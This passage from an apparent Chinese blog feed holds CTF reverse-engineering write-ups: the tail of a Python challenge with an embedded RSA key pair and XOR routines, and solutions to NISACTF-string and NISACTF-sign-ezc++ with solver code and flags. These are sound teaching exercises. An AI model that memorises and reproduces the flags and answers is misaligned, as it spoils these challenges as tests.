string">'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key2 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    crypto_text <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key2<span class="token punctuation">)</span>    <span class="token keyword">return</span> crypto_text<span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    message_str <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> message_str<span class="token keyword">def</span> <span class="token function">encrypt2</span><span class="token punctuation">(</span>tips<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt2</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    tips <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0='</span>key <span class="token operator">=</span> <span class="token string">'this is key'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please input key: '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token operator">==</span> decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> result <span class="token operator">==</span> key<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;0e26d898-b454-43de-9c87-eb3d122186bc&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key is error.'</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception<span class="token punctuation">:</span>    e <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">del</span> e</code></pre></li><li><p>在代码中插入：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>得到 key 值：this is true key</p></li><li><p>用得到的 key 值执行程序</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{5236cb7d-f4a7-4080-9bde-8b9e061609ad}</p></blockquote><ul><li>执行程序：<br>  <em>please input key:</em> <code>this is true key</code><br>  <code>flag&#123;5236cb7d-f4a7-4080-9bde-8b9e061609ad&#125;</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF-string</title>
      <link href="/2023/0397522c3.html"/>
      <url>/2023/0397522c3.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>注意随机数产生函数 srand()，是由函数 rand 使用的随机数发生器。<mark>在给定随机数种子 seed 时， srand(seed) 是按照种子 seed 生成伪随机数，并非真的随机，其实每次运行结果都是一样的</mark></p></li><li><p><mark>当执行产生随机数的代码时，尽量在 Linux 下执行代码，在 Windows 下产生的随机数可能会不一样</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/2042">NISACTF-string</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>拖入 IDA 查看 main 函数<br><img src="https://s2.loli.net/2023/03/18/3vqISPMo1TNJjkE.png" alt="NISACTF-string1.png"><br>输入字符串 v4，然后调用 <code>flag()</code> 函数</p></li><li><p>查看 <code>flag()</code> 函数<br><img src="https://s2.loli.net/2023/03/18/2oduAR5b4lviztE.png" alt="NISACTF-string2.png"><br>在下半部分发现一段直接输出 flag 的代码：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The length of flag is 13"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NSSCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里的 <code>putchar(125)</code> 就是输出 <code>&quot;&#125;&quot;</code> ，for 循环内的 <code>printf()</code> 输出就是输出的 flag</p></li><li><p>查看种子 seed 的初值：   <code>seed = 0x2766</code><br><img src="https://s2.loli.net/2023/03/18/8BkWo95EfYgDaNj.png" alt="NISACTF-string3.png"></p></li><li><p><mark>这里 seed &#x3D; 0x2766 定义了随机数种子， srand(seed) 是按照种子 seed 生成伪随机数，并非真的随机，其实每次运行结果都是一样的</mark><br>直接跑一遍代码：</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v4<span class="token punctuation">;</span>      <span class="token keyword">int</span> seed <span class="token operator">=</span> <span class="token number">0x2766</span><span class="token punctuation">;</span>      <span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NSSCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre></li><li><p>在 Windows 上的运行结果：<br><img src="https://s2.loli.net/2023/03/18/1exWcUEwX5NkbLl.png" alt="NISACTF-string4.png"><br>但是这个答案是错误的</p></li><li><p><mark>这是一个坑点，不能使用 Windows 运行这段代码，因为生产出的随机数不一样</mark><br>在 Kali Linux 上执行该代码：<br><img src="https://s2.loli.net/2023/03/18/pr3jK6hMvdlCZ4F.png" alt="NISACTF-string5.png"><br>编译并执行：<br><img src="https://s2.loli.net/2023/03/18/paMtKm7seq1nhDd.png" alt="NISACTF-string6.png"><br>这个结果是正确的</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> seed <span class="token operator">=</span> <span class="token number">0x2766</span><span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NSSCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> v4 <span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{5353316611126}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/ho1ruNfD97xmwbj.png" alt="NISACTF-string7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF-sign-ezc++</title>
      <link href="/2023/039e418780.html"/>
      <url>/2023/039e418780.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>在 C++ 中，注意命名空间，在命名空间中可能会藏有相关的函数</mark></p></li><li><p>在 IDA View-A 界面，注意汇编中数组的定义方法<br><img src="https://s2.loli.net/2023/03/19/79nrTI5DYm1gGaV.png" alt="NISACTF-sign-ezc++0.png"><br><mark>db 定义时，flag 的上下两行是连着的</mark>，<mark>2 dup(59h) 指连续 2个 59h，14h dup(0) 指连续 20个 0</mark>，完整的 flag :</p></li></ul><pre class="language-c" data-language="c"><code class="language-c">flag db <span class="token number">44</span>h<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">59</span>h<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">49</span>h<span class="token punctuation">,</span> <span class="token number">5</span>Eh<span class="token punctuation">,</span> <span class="token number">4</span>Ch<span class="token punctuation">,</span> <span class="token number">71</span>h<span class="token punctuation">,</span> <span class="token number">7</span>Eh<span class="token punctuation">,</span> <span class="token number">62</span>h<span class="token punctuation">,</span> <span class="token number">63</span>h<span class="token punctuation">,</span> <span class="token number">79</span>h<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">63</span>h<span class="token punctuation">,</span> <span class="token number">79</span>h<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">44</span>h<span class="token punctuation">,</span> <span class="token number">43</span>h<span class="token punctuation">,</span> <span class="token number">59</span>h<span class="token punctuation">,</span> <span class="token number">4</span>Bh<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">78</span>h<span class="token punctuation">,</span> <span class="token number">6F</span>h<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">79</span>h<span class="token punctuation">,</span> <span class="token number">63</span>h<span class="token punctuation">,</span> <span class="token number">6</span>Dh<span class="token punctuation">,</span> <span class="token number">64</span>h<span class="token punctuation">,</span> <span class="token number">77</span>h<span class="token punctuation">,</span> <span class="token number">14</span>h <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><hr><p><a href="https://www.ctfer.vip/problem/2041">NISACTF-sign-ezc++</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>拖入 IDA 查找 main 函数<br><img src="https://s2.loli.net/2023/03/18/VoHXnaqhQz4dDY3.png" alt="NISACTF-sign-ezc++1.png"><br>没有发现什么有用信息</p></li><li><p>shift + F12 查看字符串<br><img src="https://s2.loli.net/2023/03/18/E6jyA3mcsIT9Bah.png" alt="NISACTF-sign-ezc++2.png"><br>发现几个可能与 flag 有关的输出提示信息，查看这几个内容<br><img src="https://s2.loli.net/2023/03/18/MXSvAiesRo1x5OJ.png" alt="NISACTF-sign-ezc++3.png"><br>这几句提示信息分别位于函数 <code>Human::introduce(void)</code> 和 <code>Man::introduce(void)</code> 内，且这两个函数仅仅是两句输出，没有其他功能<br><img src="https://s2.loli.net/2023/03/18/Mi2pSe8LYTlkGOJ.png" alt="NISACTF-sign-ezc++4.png"></p></li><li><p>但是注意到 main 函数中并未调用这两个提示函数，<mark>不过可知存在两个命名空间，一个是 Human，一个是 Man</mark></p></li><li><p>搜索这两个命名空间中的函数<br><img src="https://s2.loli.net/2023/03/18/qx8ePuKkwQ57daD.png" alt="NISACTF-sign-ezc++5.png"><br>发现在 Human 的命名空间中有一个叫 <code>Human::give_flag(void)</code> 的函数</p></li><li><p>查看 <code>Human::give_flag(void)</code> 的内容<br><img src="https://s2.loli.net/2023/03/18/Nw62bLkKaRBUlS7.png" alt="NISACTF-sign-ezc++6.png"><br>查看 flag 中的内容<br><img src="https://s2.loli.net/2023/03/18/PXN84T9ns1I6JVb.png" alt="NISACTF-sign-ezc++7.png"></p></li><li><p>将程序跑一遍应该就是 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span>                      <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span>                      <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span>                      <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>                      <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xAu</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      cout<span class="token operator">&lt;&lt;</span>flag<span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{this_is_NISA_re_sign}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/v2n9YkEtbI7MfTZ.png" alt="NISACTF-sign-ezc++8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-jump_by_jump_revenge</title>
